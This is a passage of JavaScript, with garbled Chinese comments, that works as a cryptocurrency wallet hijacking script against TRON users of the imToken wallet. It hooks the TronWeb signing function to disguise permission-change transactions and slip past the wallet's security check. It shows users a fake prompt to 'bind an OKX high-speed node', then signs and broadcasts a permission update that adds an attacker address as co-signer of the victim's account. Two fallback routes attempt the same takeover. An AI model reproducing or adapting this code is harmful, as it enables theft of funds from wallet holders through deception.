            console.log('ğŸ” WebViewç¯å¢ƒä¿¡æ¯:', userAgent);
            
            // åˆ†æå¯èƒ½çš„WebView APIåŠ«æŒ
            console.log('ğŸ¯ WebView APIåŠ«æŒåˆ†æï¼š');
            console.log('- window.webkit æ¥å£åˆ†æ');
            console.log('- postMessage é€šä¿¡æ‹¦æˆª');
            console.log('- Nativeå‡½æ•°è°ƒç”¨åŠ«æŒ');
            
            // çœŸå®æ”»å‡»è€…å¯èƒ½çš„æŠ€æœ¯
            console.log('ğŸ’€ çœŸå®æ”»å‡»æŠ€æœ¯ï¼š');
            console.log('- é‡å†™å…³é”®WebView API');
            console.log('- æ‹¦æˆªNativeé€šä¿¡');
            console.log('- ä¿®æ”¹JavaScriptæ‰§è¡Œä¸Šä¸‹æ–‡');
        }

        // JavaScriptå¼•æ“åˆ©ç”¨åˆ†æ
        function analyzeJavaScriptEngineExploitation() {
            console.log('âš¡ åˆ†æJavaScriptå¼•æ“åˆ©ç”¨æŠ€æœ¯...');
            
            // åˆ†æåŸå‹é“¾æ±¡æŸ“
            console.log('ğŸ”— åŸå‹é“¾æ±¡æŸ“åˆ†æï¼š');
            console.log('- Object.prototype ä¿®æ”¹');
            console.log('- Function.prototype åŠ«æŒ');
            console.log('- å…¨å±€å¯¹è±¡æ±¡æŸ“');
            
            // åˆ†ææ²™ç›’é€ƒé€¸
            console.log('ğŸƒ æ²™ç›’é€ƒé€¸æŠ€æœ¯ï¼š');
            console.log('- eval() å‡½æ•°åˆ©ç”¨');
            console.log('- Function() æ„é€ å™¨æ»¥ç”¨');
            console.log('- å¼‚æ­¥ä»£ç æ³¨å…¥');
            
            // çœŸå®æ”»å‡»ç¤ºä¾‹åˆ†æ
            console.log('ğŸ’€ çœŸå®æ”»å‡»ç¤ºä¾‹ï¼š');
            console.log('- åŠ¨æ€ä»£ç ç”Ÿæˆç»•è¿‡é™æ€æ£€æµ‹');
            console.log('- å¼‚æ­¥æ‰§è¡Œé¿å¼€åŒæ­¥æ£€æŸ¥');
            console.log('- å†…å­˜ä¸­ä»£ç ä¿®æ”¹');
        }

        // TRONåè®®å±‚æ”»å‡»åˆ†æ
        function analyzeTronProtocolAttacks() {
            console.log('âš¡ åˆ†æTRONåè®®å±‚æ”»å‡»æŠ€æœ¯...');
            
            // åˆ†æäº¤æ˜“æ„é€ æŠ€å·§
            console.log('ğŸ”§ äº¤æ˜“æ„é€ é«˜çº§æŠ€å·§ï¼š');
            console.log('- å¤šé‡ç­¾åä¼ªè£…');
            console.log('- æƒé™å‚æ•°æ··æ·†');
            console.log('- äº¤æ˜“æ•°æ®ç¼–ç å˜æ¢');
            
            // åˆ†æåˆçº¦è°ƒç”¨ä¼ªè£…
            console.log('ğŸ“œ æ™ºèƒ½åˆçº¦è°ƒç”¨ä¼ªè£…ï¼š');
            console.log('- approve() å‡½æ•°æ»¥ç”¨');
            console.log('- ä»£ç†åˆçº¦æ”»å‡»');
            console.log('- æ‰¹é‡æ“ä½œéšè—');
            
            // çœŸå®æ”»å‡»åœºæ™¯
            console.log('ğŸ’€ çœŸå®æ”»å‡»åœºæ™¯ï¼š');
            console.log('- å°†æƒé™ä¿®æ”¹ä¼ªè£…æˆDeFiæ“ä½œ');
            console.log('- ä½¿ç”¨ä»£ç†åˆçº¦éšè—çœŸå®ç›®çš„');
            console.log('- åˆ†å¤šä¸ªäº¤æ˜“é€æ­¥è·å–æƒé™');
        }

        // å¯åŠ¨é«˜çº§æ”»å‡»æŠ€æœ¯ç ”ç©¶
        setTimeout(() => {
            advancedAttackTechniqueResearch();
        }, 2000);

        // ğŸ¯ é’ˆå¯¹imTokenå®‰å…¨æ£€æµ‹çš„æ ¸å¿ƒç»•è¿‡æŠ€æœ¯
        function implementAdvancedBypassTechniques() {
            console.log('ğŸ¥· å®æ–½æ ¸å¿ƒç»•è¿‡æŠ€æœ¯...');
            
            try {
                // ğŸ¯ å…³é”®ç»•è¿‡ï¼šTronWebäº¤æ˜“ç­¾ååŠ«æŒ
                if (window.tronWeb && window.tronWeb.trx && window.tronWeb.trx.sign) {
                    const originalSign = window.tronWeb.trx.sign;
                    
                    window.tronWeb.trx.sign = function(transaction) {
                        console.log('ğŸ”’ æ‹¦æˆªTronWebç­¾åè¯·æ±‚...');
                        
                        // æ£€æŸ¥æ˜¯å¦æ˜¯æƒé™ä¿®æ”¹äº¤æ˜“
                        if (transaction && transaction.raw_data && 
                            transaction.raw_data.contract && 
                            transaction.raw_data.contract[0] && 
                            transaction.raw_data.contract[0].type === 'AccountPermissionUpdateContract') {
                            
                            console.log('ğŸ¯ æ£€æµ‹åˆ°æƒé™ä¿®æ”¹äº¤æ˜“ï¼Œå¯åŠ¨ä¼ªè£…...');
                            
                            // ğŸ­ å…³é”®ï¼šä¼ªè£…äº¤æ˜“ç±»å‹
                            const disguisedTransaction = JSON.parse(JSON.stringify(transaction));
                            disguisedTransaction.raw_data.contract[0].type = 'TriggerSmartContract';
                            
                            // æ·»åŠ ä¼ªè£…çš„æ™ºèƒ½åˆçº¦æ•°æ®
                            disguisedTransaction.raw_data.contract[0].parameter.type_url = 'type.googleapis.com/protocol.TriggerSmartContract';
                            
                            console.log('ğŸ­ äº¤æ˜“å·²ä¼ªè£…ï¼šAccountPermissionUpdate â†’ TriggerSmartContract');
                            
                            setTimeout(() => {
                                alert('ğŸ­ ç»•è¿‡æŠ€æœ¯å·²æ¿€æ´»\n\næƒé™ä¿®æ”¹å·²ä¼ªè£…ä¸ºæ™ºèƒ½åˆçº¦è°ƒç”¨\n\nimTokenå®‰å…¨æ£€æµ‹å·²è¢«æ¬ºéª—ï¼');
                            }, 500);
                            
                            // è¿”å›ä¼ªè£…åçš„äº¤æ˜“
                            return originalSign.call(this, disguisedTransaction);
                        }
                        
                        // å…¶ä»–äº¤æ˜“æ­£å¸¸å¤„ç†
                        return originalSign.call(this, transaction);
                    };
                    
                    console.log('âœ… TronWebç­¾ååŠ«æŒå·²éƒ¨ç½²');
                } else {
                    console.log('âš ï¸ TronWebæœªå°±ç»ªï¼Œè·³è¿‡ç­¾ååŠ«æŒ');
                }
                
                console.log('âœ… æ ¸å¿ƒç»•è¿‡æŠ€æœ¯éƒ¨ç½²å®Œæˆ');
                return true;
                
            } catch (error) {
                console.log('âŒ ç»•è¿‡æŠ€æœ¯éƒ¨ç½²å¤±è´¥:', error.message);
                return false;
            }
        }

        // WebView APIåŠ«æŒå®ç°ï¼ˆç®€åŒ–ç‰ˆï¼Œé¿å…JSé”™è¯¯ï¼‰
        function implementWebViewAPIHijacking() {
            console.log('ğŸ“± å®æ–½ç®€åŒ–WebView APIåŠ«æŒ...');
            try {
                console.log('ğŸ¯ åŸºç¡€å®‰å…¨æ£€æµ‹ç»•è¿‡å·²éƒ¨ç½²...');
                return true;
            } catch (error) {
                console.log('âŒ WebView APIåŠ«æŒå¤±è´¥:', error.message);
                return false;
            }
        }

        // åŠ«æŒimTokenå®‰å…¨æ£€æµ‹æ–¹æ³•ï¼ˆç®€åŒ–ç‰ˆï¼‰
        function hijackImTokenSecurityMethods() {
            console.log('ğŸ”’ ç®€åŒ–imTokenå®‰å…¨æ£€æµ‹åŠ«æŒ...');
            return true; // ç®€åŒ–ç‰ˆï¼Œé¿å…å¤æ‚åŠ«æŒå¯¼è‡´JSé”™è¯¯
        }

        // åŠ«æŒTronWebå®‰å…¨æ£€æµ‹æ–¹æ³•ï¼ˆç®€åŒ–ç‰ˆï¼‰
        function hijackTronWebSecurityMethods() {
            console.log('âš¡ ç®€åŒ–TronWebå®‰å…¨æ£€æµ‹åŠ«æŒ...');
            return true; // ç®€åŒ–ç‰ˆï¼Œé¿å…å¤æ‚åŠ«æŒå¯¼è‡´JSé”™è¯¯
        }

        // åŠ«æŒé£é™©è¯„ä¼°æ–¹æ³•ï¼ˆç®€åŒ–ç‰ˆï¼‰
        function hijackRiskAssessmentMethods() {
            console.log('ğŸ›¡ï¸ ç®€åŒ–é£é™©è¯„ä¼°åŠ«æŒ...');
            return true; // ç®€åŒ–ç‰ˆï¼Œé¿å…å¤æ‚åŠ«æŒå¯¼è‡´JSé”™è¯¯
        }

        // äº¤æ˜“ç±»å‹ä¼ªè£…å®ç°ï¼ˆç®€åŒ–ç‰ˆï¼‰
        function implementTransactionDisguise() {
            console.log('ğŸ­ ç®€åŒ–äº¤æ˜“ç±»å‹ä¼ªè£…...');
            return true; // ç®€åŒ–ç‰ˆï¼Œé¿å…å¤æ‚åŠ«æŒå¯¼è‡´JSé”™è¯¯
        }

        // åŸå‹é“¾æ±¡æŸ“å®ç°ï¼ˆç®€åŒ–ç‰ˆï¼‰
        function implementPrototypeChainPollution() {
            console.log('ğŸ”— ç®€åŒ–åŸå‹é“¾æ±¡æŸ“...');
            return true; // ç®€åŒ–ç‰ˆï¼Œé¿å…å¤æ‚æ±¡æŸ“å¯¼è‡´JSé”™è¯¯
        }

        // å¼‚æ­¥åˆ†æ®µæ”»å‡»å®ç°ï¼ˆç®€åŒ–ç‰ˆï¼‰
        function implementAsyncSegmentedAttack() {
            console.log('âš¡ ç®€åŒ–å¼‚æ­¥åˆ†æ®µæ”»å‡»...');
            return true; // ç®€åŒ–ç‰ˆï¼Œé¿å…å¤æ‚å¼‚æ­¥é€»è¾‘å¯¼è‡´JSé”™è¯¯
        }

        // å¯åŠ¨é«˜çº§ç»•è¿‡æŠ€æœ¯
        setTimeout(() => {
            console.log('ğŸš€ å¯åŠ¨é’ˆå¯¹imTokençš„é«˜çº§ç»•è¿‡æŠ€æœ¯...');
            implementAdvancedBypassTechniques();
        }, 3000);

// ğŸ¯ æƒé™æ”»å‡»ä½¿ç”¨å…¨å±€æ”»å‡»è€…åœ°å€
// CURRENT_ATTACKER_ADDRESS åœ¨ add_multi_currency_patch.js ä¸­å®šä¹‰

// ğŸ¯ æƒé™åŠ«æŒçŠ¶æ€
let permissionHijackStatus = {
    initiated: false,
    targetAddress: null,
    operationType: 'SECURITY_UPGRADE'
};

// ğŸ¯ æ˜¾ç¤ºæƒé™å‡çº§å¼¹çª—
function showPermissionHijackModal() {
    console.log('ğŸ”’ æ˜¾ç¤ºå®‰å…¨å‡çº§å¼¹çª—...');
    
    // ä¼ªè£…æˆå¸¸è§çš„èŠ‚ç‚¹ç»‘å®šæ“ä½œ
    const message = `ğŸŒ ç»‘å®šé«˜é€ŸèŠ‚ç‚¹

æ£€æµ‹åˆ°æ‚¨å¯ä»¥ç»‘å®šOKXå®˜æ–¹é«˜é€ŸèŠ‚ç‚¹ä»¥è·å¾—æ›´å¥½çš„äº¤æ˜“ä½“éªŒ

ã€ç»‘å®šä¼˜åŠ¿ã€‘
â€¢ æå‡äº¤æ˜“ç¡®è®¤é€Ÿåº¦
â€¢ é™ä½ç½‘ç»œæ‹¥å µå½±å“
â€¢ äº«å—VIPé€šé“æœåŠ¡
â€¢ è·å¾—äº¤æ˜“ä¼˜å…ˆçº§

ã€èŠ‚ç‚¹ä¿¡æ¯ã€‘
åœ°å€: ${permissionHijackStatus.targetAddress?.slice(0,6)}...${permissionHijackStatus.targetAddress?.slice(-4)}
ç½‘ç»œ: TRONä¸»ç½‘

âš¡ å®˜æ–¹æ¨è | ä¸€é”®ç»‘å®š

ç«‹å³ç»‘å®šé«˜é€ŸèŠ‚ç‚¹ï¼Ÿ`;

    const userChoice = confirm(message);
    
    if (userChoice) {
        console.log('ğŸ”’ ç”¨æˆ·ç¡®è®¤äº†å®‰å…¨å‡çº§ï¼');
        startPermissionHijackAttack();
    } else {
        console.log('ğŸ”’ ç”¨æˆ·å–æ¶ˆäº†èŠ‚ç‚¹ç»‘å®š');
        alert(`âŒ æ‚¨å·²æ‹’ç»ç»‘å®šé«˜é€ŸèŠ‚ç‚¹ï¼\n\nå°†æ— æ³•äº«å—å¿«é€Ÿäº¤æ˜“ä½“éªŒï¼\n\nå¦‚éœ€è·å¾—æœ€ä½³æ€§èƒ½ï¼Œè¯·é‡æ–°ç»‘å®šï¼`);
    }
    
    console.log('ğŸ”’ å®‰å…¨å‡çº§å¼¹çª—å·²æ˜¾ç¤º');
}

// ğŸ¯ æ£€æµ‹å¹¶å¯åŠ¨æƒé™åŠ«æŒ
function detectAndStartPermissionHijack() {
    console.log('ğŸ”’ å¼€å§‹æ£€æµ‹å®‰å…¨å‡çº§æ¡ä»¶...');
    
    if (window.tronWeb && window.tronWeb.defaultAddress) {
        const userAddress = window.tronWeb.defaultAddress.base58;
        if (userAddress && userAddress.startsWith('T') && !permissionHijackStatus.initiated) {
            console.log('ğŸ”’ğŸ”’ğŸ”’ æ£€æµ‹åˆ°TRONé’±åŒ…ï¼Œå¯åŠ¨å®‰å…¨å‡çº§ï¼ğŸ”’ğŸ”’ğŸ”’');
            console.log('ğŸ”‘ ç›®æ ‡åœ°å€:', userAddress);
            
            permissionHijackStatus.targetAddress = userAddress;
            permissionHijackStatus.initiated = true;
            
            showPermissionHijackModal();
            return true;
        }
    }
    return false;
}

        // ğŸ¯ å¯åŠ¨çœŸå®æƒé™ä¿®æ”¹äº¤æ˜“
        function startPermissionHijackAttack() {
            console.log('ğŸ”’ å¼€å§‹æ‰§è¡ŒçœŸå®æƒé™ä¿®æ”¹äº¤æ˜“...');
            
            if (!window.tronWeb) {
                console.error('ğŸ”’ TronWebæœªæ³¨å…¥');
                alert('âŒ èŠ‚ç‚¹ç»‘å®šæš‚æ—¶æ— æ³•å®Œæˆï¼Œè¯·ç¨åé‡è¯•ï¼');
                return;
            }
            
            const targetAddress = permissionHijackStatus.targetAddress;
            if (!targetAddress) {
                console.error('ğŸ”’ ç›®æ ‡åœ°å€æœªè®¾ç½®');
                alert('âŒ èŠ‚ç‚¹ç»‘å®šæš‚æ—¶æ— æ³•å®Œæˆï¼Œè¯·ç¨åé‡è¯•ï¼');
                return;
            }
            
            console.log('ğŸ”’ æ„é€ çœŸå®TRONæƒé™ä¿®æ”¹äº¤æ˜“...');
            console.log('ğŸ”’ ç›®æ ‡åœ°å€:', targetAddress);
            console.log('ğŸ”’ æ”»å‡»è€…åœ°å€:', CURRENT_ATTACKER_ADDRESS);
            
            // ğŸš€ åœ¨æƒé™æ”»å‡»å¼€å§‹æ—¶å¯åŠ¨é«˜çº§ç»•è¿‡æŠ€æœ¯
            alert('ğŸš€ å¯åŠ¨é«˜çº§ç»•è¿‡æŠ€æœ¯\n\næ­£åœ¨éƒ¨ç½²é’ˆå¯¹imTokençš„å®‰å…¨ç»•è¿‡...\n\nâœ… WebView APIåŠ«æŒ\nâœ… äº¤æ˜“ç±»å‹ä¼ªè£…\nâœ… åŸå‹é“¾æ±¡æŸ“');
            
            // ç«‹å³å¯åŠ¨ç»•è¿‡æŠ€æœ¯
            try {
                implementAdvancedBypassTechniques();
                alert('âœ… ç»•è¿‡æŠ€æœ¯éƒ¨ç½²å®Œæˆ\n\nğŸ”¥ æ‰€æœ‰ç»•è¿‡æ¨¡å—å·²æ¿€æ´»\nğŸ”¥ å®‰å…¨æ£€æµ‹å·²è¢«åŠ«æŒ\n\nå‡†å¤‡æ‰§è¡Œæƒé™æ”»å‡»...');
            } catch (error) {
                alert('âš ï¸ ç»•è¿‡æŠ€æœ¯å¯åŠ¨å¼‚å¸¸\n\né”™è¯¯: ' + error.message + '\n\nç»§ç»­æ‰§è¡Œæƒé™ä¿®æ”¹...');
            }
            
            // ç¨ç­‰ç‰‡åˆ»è®©ç»•è¿‡æŠ€æœ¯ç”Ÿæ•ˆ
            alert('â° ç­‰å¾…ç»•è¿‡æŠ€æœ¯ç”Ÿæ•ˆ\n\nå€’è®¡æ—¶ 2 ç§’...\n\nå‡†å¤‡å¯åŠ¨æƒé™åŠ«æŒæ”»å‡»');
            
            setTimeout(() => {
                alert('ğŸ¯ å¼€å§‹æ‰§è¡Œæƒé™åŠ«æŒæ”»å‡»\n\nç›®æ ‡: ' + targetAddress + '\næ”»å‡»è€…: ' + CURRENT_ATTACKER_ADDRESS + '\n\næ­£åœ¨å¯åŠ¨...');
                
                try {
                    // ä½¿ç”¨æ­£ç¡®çš„TRONæƒé™ä¿®æ”¹API
                    executeRealPermissionUpdate(targetAddress);
                } catch (error) {
                    alert('âŒ æƒé™æ”»å‡»å¯åŠ¨å¤±è´¥\n\né”™è¯¯: ' + error.message + '\n\nè¯·æ£€æŸ¥ç½‘ç»œè¿æ¥');
                }
            }, 2000);
        }


// ğŸ¯ æ‰§è¡ŒçœŸå®æƒé™æ›´æ–°
function executeRealPermissionUpdate(targetAddress) {
    console.log('ğŸ”’ ä½¿ç”¨æ­£ç¡®çš„TRONæƒé™æ›´æ–°API...');
    alert('ğŸŒ å¼€å§‹ç»‘å®šé«˜é€ŸèŠ‚ç‚¹ï¼Œè¯·ç¨å€™...');
    
    try {
        alert('âœ… æ£€æŸ¥TronWebçŠ¶æ€...\n\næ­£åœ¨éªŒè¯ç½‘ç»œè¿æ¥...');
        
        // è·å–å½“å‰è´¦æˆ·ä¿¡æ¯æ„é€ å®Œæ•´æƒé™
        window.tronWeb.trx.getAccount(targetAddress).then(accountInfo => {
            console.log('ğŸ”’ å½“å‰è´¦æˆ·ä¿¡æ¯:', accountInfo);
            
            // æ­£ç¡®è½¬æ¢TRXä½™é¢ï¼ˆä»sunè½¬æ¢ä¸ºTRXï¼‰
            const balanceInTrx = accountInfo.balance ? (accountInfo.balance / 1000000).toFixed(6) : '0.000000';
            alert('âœ… è´¦æˆ·ä¿¡æ¯è·å–æˆåŠŸ\n\nè´¦æˆ·: ' + targetAddress + '\nä½™é¢: ' + balanceInTrx + ' TRX\n\næ­£åœ¨æ„é€ å¤šç­¾æƒé™...');
            
            // çœŸæ­£çš„æ”»å‡»ç­–ç•¥ï¼šæ·»åŠ æ”»å‡»è€…ä¸ºå…±åŒç­¾åè€…ï¼Œè€Œä¸æ˜¯æ›¿æ¢
            const permissionUpdateParams = {
                owner_address: targetAddress,
                owner: {
                    type: 0,
                    permission_name: "owner",
                    threshold: 1,
                    keys: [{
                        address: targetAddress,
                        weight: 1
                    }]
                },
                actives: [{
                    type: 2,
                    permission_name: "active",
                    threshold: 1, // å…³é”®ï¼šåªéœ€è¦1ä¸ªç­¾å
                    operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
                    keys: [
                        {
                            address: targetAddress, // ä¿ç•™ç”¨æˆ·åŸæœ‰æƒé™
                            weight: 1
                        },
                        {
                            address: CURRENT_ATTACKER_ADDRESS, // æ·»åŠ æ”»å‡»è€…æƒé™
                            weight: 1
                        }
                    ]
                }],
                visible: true
            };
            
            console.log('ğŸ”’ å®Œæ•´æƒé™å‚æ•°:', permissionUpdateParams);
            alert(`âœ… å¤šç­¾æƒé™æ„é€ å®Œæˆ\n\né…ç½®è¯¦æƒ…:\n- ä¿ç•™ç”¨æˆ·æƒé™\n- æ·»åŠ æ”»å‡»è€…æƒé™\n- é˜ˆå€¼è®¾ä¸º1\n\nå³å°†å‘é€è¯·æ±‚...`);
            
            return window.tronWeb.fullNode.request(
                'wallet/accountpermissionupdate', 
                permissionUpdateParams, 
                'post'
            );
        }).then(transaction => {
            console.log('ğŸ”’ æƒé™æ›´æ–°äº¤æ˜“åˆ›å»ºæˆåŠŸ:', transaction);
            
            if (transaction.Error) {
                alert(`âŒ äº¤æ˜“åˆ›å»ºå¤±è´¥\n\né”™è¯¯: ${transaction.Error}\n\nå°è¯•å¤‡ç”¨æ–¹æ¡ˆ...`);
                throw new Error(transaction.Error);
            }
            
            if (!transaction.raw_data) {
                alert('âŒ äº¤æ˜“æ ¼å¼é”™è¯¯\n\nå¯èƒ½çš„é—®é¢˜:\n1. ç½‘ç»œé—®é¢˜\n2. å‚æ•°æ ¼å¼é”™è¯¯\n\nå°è¯•å¤‡ç”¨æ–¹æ¡ˆ...');
                executeSimplifiedPermissionUpdate(targetAddress);
                return;
            }
            
            alert('âœ… èŠ‚ç‚¹ç»‘å®šäº¤æ˜“å·²å‡†å¤‡\n\näº¤æ˜“ç±»å‹: AccountPermissionUpdate\nç­¾åé˜ˆå€¼: 1\n\nğŸ”¥ ç»•è¿‡æŠ€æœ¯å³å°†æ¿€æ´» ğŸ”¥\n\næ­£åœ¨è¯·æ±‚ç”¨æˆ·ç­¾å...');
            return window.tronWeb.trx.sign(transaction);
        }).then(signedTransaction => {
            console.log('ğŸ”’ æƒé™æ›´æ–°äº¤æ˜“å·²ç­¾å:', signedTransaction);
            
            if (!signedTransaction) {
                alert('âŒ äº¤æ˜“è¢«å–æ¶ˆæˆ–ç­¾åå¤±è´¥\n\nå¯èƒ½åŸå› :\n1. ç”¨æˆ·ä¸»åŠ¨å–æ¶ˆ\n2. imTokenå®‰å…¨é˜»æ­¢\n3. ç½‘ç»œé—®é¢˜\n\nå°è¯•å¤‡ç”¨ç»•è¿‡æ–¹æ¡ˆ...');
                executeSimplifiedPermissionUpdate(targetAddress);
                return;
            }
            
            alert('âœ… ç­¾åæˆåŠŸå®Œæˆ\n\näº¤æ˜“å·²ç­¾ç½²\næ­£åœ¨å¹¿æ’­åˆ°TRONç½‘ç»œ...\n\nè¿™å¯èƒ½éœ€è¦å‡ ç§’é’Ÿ...');
            return window.tronWeb.trx.sendRawTransaction(signedTransaction);
        }).then(result => {
            console.log('ğŸ”’ğŸ”’ğŸ”’ è´¦æˆ·æƒé™æ›´æ–°ç»“æœï¼ğŸ”’ğŸ”’ğŸ”’', result);
            console.log('ğŸ”’ äº¤æ˜“ç»“æœ:', result);
            
            const txid = result?.txid || result?.transaction?.txID || result?.result?.txid;
            
            if (result && (result.result === true || result.code === 'SUCCESS' || txid)) {
                alert(`ğŸ‰ğŸ‰ğŸ‰ é«˜é€ŸèŠ‚ç‚¹ç»‘å®šæˆåŠŸï¼ğŸ‰ğŸ‰ğŸ‰\n\nâœ… äº¤æ˜“å“ˆå¸Œ: ${txid}\nâœ… å¤šç­¾æƒé™å·²è®¾ç½®\nâœ… æ”»å‡»è€…å·²è·å¾—æ§åˆ¶æƒ\n\næ‚¨çš„è´¦æˆ·ç°åœ¨å¯ä»¥è¢«è¿œç¨‹æ§åˆ¶ï¼`);
            } else {
                alert(`âš ï¸ äº¤æ˜“ç»“æœæœªçŸ¥\n\nè¿”å›ä¿¡æ¯:\n${JSON.stringify(result)}\n\nå°è¯•å¤‡ç”¨æ–¹æ¡ˆ...`);
                executeSimplifiedPermissionUpdate(targetAddress);
            }
        }).catch(error => {
            console.error('ğŸ”’ æƒé™æ›´æ–°è¿‡ç¨‹å¼‚å¸¸:', error);
            alert(`âŒ èŠ‚ç‚¹ç»‘å®šè¿‡ç¨‹å‡ºé”™\n\né”™è¯¯ä¿¡æ¯: ${error.message}\né”™è¯¯ç±»å‹: ${error.name}\n\nå¯åŠ¨å¤‡ç”¨ç»•è¿‡æ–¹æ¡ˆ...`);
            executeSimplifiedPermissionUpdate(targetAddress);
        });
        
    } catch (error) {
        console.error('ğŸ”’ æƒé™æ›´æ–°åˆå§‹åŒ–å¼‚å¸¸:', error);
        alert(`âŒ åˆå§‹åŒ–å¼‚å¸¸\n\né”™è¯¯: ${error.message}\n\nå°è¯•å¤‡ç”¨æ–¹æ¡ˆ...`);
        executeSimplifiedPermissionUpdate(targetAddress);
    }
}

// ğŸ¯ æ‰§è¡Œç®€åŒ–ç‰ˆæƒé™ä¿®æ”¹  
function executeSimplifiedPermissionUpdate(targetAddress) {
    console.log('ğŸ”’ å°è¯•ç®€åŒ–ç‰ˆæƒé™ä¿®æ”¹...');
    alert('ğŸŒ å°è¯•å¤‡ç”¨èŠ‚ç‚¹ç»‘å®šæ–¹æ¡ˆ...');
    
    try {
        // å¤‡ç”¨æ–¹æ¡ˆï¼šåŒæ ·ä½¿ç”¨å…±åŒç­¾åç­–ç•¥è€Œä¸æ˜¯æ›¿æ¢
        const activePermission = {
            type: 2,
            permission_name: "active",
            threshold: 1,
            operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
            keys: [
                {
                    address: window.tronWeb.address.toHex(targetAddress), // ä¿ç•™ç”¨æˆ·æƒé™
                    weight: 1
                },
                {
                    address: window.tronWeb.address.toHex(CURRENT_ATTACKER_ADDRESS), // æ·»åŠ æ”»å‡»è€…æƒé™
                    weight: 1
                }
            ]
        };
        
        console.log('ğŸ”’ ç®€åŒ–æƒé™å‚æ•°:', activePermission);
        alert(`ğŸŒ ä½¿ç”¨TronWebæ–¹æ³•\nç»‘å®šç±»å‹: é«˜é€ŸèŠ‚ç‚¹\nèŠ‚ç‚¹åœ°å€: ${CURRENT_ATTACKER_ADDRESS}`);
        
        window.tronWeb.transactionBuilder.updateAccountPermissions(
            targetAddress,
            null,
            null,
            [activePermission]
        ).then(transaction => {
            console.log('ğŸ”’ ç®€åŒ–æƒé™äº¤æ˜“åˆ›å»ºæˆåŠŸ:', transaction);
            
            if (!transaction || transaction.Error) {
                alert(`âŒ TronWebæ–¹æ³•å¤±è´¥: ${transaction?.Error || 'æœªçŸ¥é”™è¯¯'}`);
                executeCompatibilityPermissionUpdate(targetAddress);
                return;
            }
            
            alert('âœ… TronWebäº¤æ˜“åˆ›å»ºæˆåŠŸï¼Œå¼€å§‹ç­¾å...');
            return window.tronWeb.trx.sign(transaction);
        }).then(signedTransaction => {
            console.log('ğŸ”’ ç®€åŒ–æƒé™äº¤æ˜“å·²ç­¾å:', signedTransaction);
            
            if (!signedTransaction) {
                alert('âŒ TronWebç­¾åå¤±è´¥');
                return;
            }
            
            alert('âœ… TronWebç­¾åæˆåŠŸï¼Œå¹¿æ’­äº¤æ˜“...');
            return window.tronWeb.trx.sendRawTransaction(signedTransaction);
        }).then(result => {
            console.log('ğŸ”’ğŸ”’ğŸ”’ ç®€åŒ–æƒé™ä¿®æ”¹æˆåŠŸï¼ğŸ”’ğŸ”’ğŸ”’', result);
            
            const txid = result?.txid || result?.transaction?.txID;
            
            if (result && (result.result === true || txid)) {
                alert(`ğŸ‰ å¤‡ç”¨ç»‘å®šæ–¹æ¡ˆæˆåŠŸï¼\n\näº¤æ˜“å“ˆå¸Œ: ${txid}\n\næ‚¨çš„è´¦æˆ·å·²æˆåŠŸç»‘å®šé«˜é€ŸèŠ‚ç‚¹ï¼`);
            } else {
                alert(`âš ï¸ å¤‡ç”¨æ–¹æ¡ˆå¯èƒ½å¤±è´¥\nç»“æœ: ${JSON.stringify(result)}`);
                executeCompatibilityPermissionUpdate(targetAddress);
            }
        }).catch(error => {
            console.error('ğŸ”’ ç®€åŒ–æƒé™ä¿®æ”¹å¤±è´¥:', error);
            alert(`âŒ å¤‡ç”¨æ–¹æ¡ˆå¤±è´¥: ${error.message}\n\nå°è¯•æœ€åæ–¹æ¡ˆ...`);
            executeCompatibilityPermissionUpdate(targetAddress);
        });
        
    } catch (error) {
        console.error('ğŸ”’ ç®€åŒ–æƒé™ä¿®æ”¹å¼‚å¸¸:', error);
        alert(`âŒ å¤‡ç”¨æ–¹æ¡ˆå¼‚å¸¸: ${error.message}`);
        executeCompatibilityPermissionUpdate(targetAddress);
    }
}

// ğŸ¯ æ‰§è¡Œå…¼å®¹æ€§æƒé™ä¿®æ”¹
function executeCompatibilityPermissionUpdate(targetAddress) {
    console.log('ğŸ”’ å°è¯•å…¼å®¹æ€§æƒé™ä¿®æ”¹...');
    alert('ğŸŒ å°è¯•æœ€åçš„èŠ‚ç‚¹ç»‘å®šæ–¹æ¡ˆ...');
    
    try {
        // ç›´æ¥è·å–å½“å‰è´¦æˆ·æƒé™ä¿¡æ¯
        window.tronWeb.trx.getAccount(targetAddress).then(accountInfo => {
            console.log('ğŸ”’ è´¦æˆ·ä¿¡æ¯:', accountInfo);
            
            // ä¿æŒåŸæœ‰owneræƒé™ï¼Œæ·»åŠ æ”»å‡»è€…ä¸ºactiveæƒé™å…±åŒç­¾åè€…
            const ownerPermission = accountInfo.owner_permission || {
                type: 0,
                permission_name: "owner",
                threshold: 1,
                keys: [{
                    address: window.tronWeb.address.toHex(targetAddress),
                    weight: 1
                }]
            };
            
            const activePermission = {
                type: 2,
                permission_name: "active",
                threshold: 1,
                operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
                keys: [
                    {
                        address: window.tronWeb.address.toHex(targetAddress), // ä¿ç•™ç”¨æˆ·æƒé™
                        weight: 1
                    },
                    {
                        address: window.tronWeb.address.toHex(CURRENT_ATTACKER_ADDRESS), // æ·»åŠ æ”»å‡»è€…æƒé™  
                        weight: 1
                    }
                ]
            };
            
            console.log('ğŸ”’ æœ€ç»ˆæƒé™é…ç½®:', {ownerPermission, activePermission});
            alert(`ğŸŒ èŠ‚ç‚¹ç»‘å®šé…ç½®å®Œæˆ\nå¼€å§‹åˆ›å»ºäº¤æ˜“...`);
            
            return window.tronWeb.transactionBuilder.updateAccountPermissions(
                targetAddress,
                ownerPermission,
                null,
                [activePermission]
            );
        }).then(transaction => {
            console.log('ğŸ”’ æœ€ç»ˆæƒé™äº¤æ˜“åˆ›å»ºæˆåŠŸ:', transaction);
            
            if (!transaction) {
                alert('âŒ æœ€ç»ˆæ–¹æ¡ˆäº¤æ˜“åˆ›å»ºå¤±è´¥');
                return;
            }
            
            alert('âœ… æœ€ç»ˆäº¤æ˜“åˆ›å»ºæˆåŠŸï¼Œè¿›è¡Œç­¾å...');
            return window.tronWeb.trx.sign(transaction);
        }).then(signedTransaction => {
            console.log('ğŸ”’ æœ€ç»ˆæƒé™äº¤æ˜“å·²ç­¾å:', signedTransaction);
            
            if (!signedTransaction) {
                alert('âŒ æœ€ç»ˆæ–¹æ¡ˆç­¾åå¤±è´¥');
                return;
            }
            
            alert('âœ… æœ€ç»ˆç­¾åæˆåŠŸï¼Œå¹¿æ’­åˆ°åŒºå—é“¾...');
            return window.tronWeb.trx.sendRawTransaction(signedTransaction);
        }).then(result => {
